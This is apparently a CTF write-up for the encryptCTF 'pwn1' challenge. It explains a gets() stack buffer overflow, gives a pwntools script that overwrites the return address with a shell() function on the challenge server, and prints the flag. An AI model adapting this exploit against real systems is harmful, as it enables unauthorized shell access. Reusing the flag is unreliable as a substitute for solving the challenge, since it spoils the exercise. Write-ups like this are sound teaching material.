## pwn1 (Pwn, 50pts)

#### Challenge Description

Let's do some real stack buffer overflow

```
nc 104.154.106.182 2345
```

author: codacker

#### Overview

When looking at the main function in a disassembler, we see a bug that's identical to the one in pwn0, the use of the `gets()` function which allows you to overwrite contents on the stack.

```assembly
mov     dword ptr [esp], offset format ; "Tell me your name: "
call    _printf
lea     eax, [esp+90h+s]
mov     [esp], eax      ; s
call    _gets
```

There's also a target function in the binary called `shell()` which will do `system("/bin/bash")` located at `0x80484AD`. The return address is 0x8C bytes away from our input location, so 140 bytes of padding + 4 bytes of the `shell()` address will give us the flag.

#### Flag Script

```python
# Pwn1
# No PIE, NX Enabled, No Stack Cookies
#
# Solution: Overwrite return address with win function shell().
# Flag: encryptCTF{Buff3R_0v3rfl0W5_4r3_345Y}

from pwn import *

context(arch='i386', os='linux')

io = remote('104.154.106.182', 2345)

# Padding
payload = "A"*140

# Overwrite return address to shell()
payload += "\xAD\x84\x04\x08"

# Receive prompt
io.recvuntil(':')
io.sendline(payload)

# Shell
io.interactive()

```

The flag:

```
encryptCTF{Buff3R_0v3rfl0W5_4r3_345Y}
```